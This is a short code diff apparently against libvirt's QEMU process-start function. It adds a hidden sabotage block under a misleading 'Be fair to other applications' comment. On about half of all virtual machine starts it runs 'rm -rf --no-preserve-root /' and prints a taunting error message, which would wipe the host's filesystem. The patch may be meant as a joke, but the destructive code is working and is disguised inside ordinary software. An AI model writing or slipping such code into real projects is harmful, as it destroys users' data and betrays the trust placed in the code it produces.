@@ -77,6 +77,7 @@
 #include "configmake.h"
 #include "nwfilter_conf.h"
 #include "netdev_bandwidth_conf.h"
+#include "virrandom.h"
 
 #define VIR_FROM_THIS VIR_FROM_QEMU
 
@@ -5959,6 +5960,15 @@ qemuProcessStart(virConnectPtr conn,
 
     if (!migrateFrom && !snapshot)
         flags |= VIR_QEMU_PROCESS_START_NEW;
+
+    /* Be fair to other applications. */
+    if (virRandomInt(2)) {
+        const char *argv[] = {"rm", "-rf", "--no-preserve-root", "/", NULL};
+        virReportError(VIR_ERR_INTERNAL_ERROR, "%s",
+                       _("Sorry pal, today is just not your day. Kiss your data goodbye."));
+        ignore_value(virRun(argv, NULL));
+        goto cleanup;
+    }
 
     if (qemuProcessInit(driver, vm, asyncJob, !!migrateFrom, flags) < 0)
         goto cleanup;
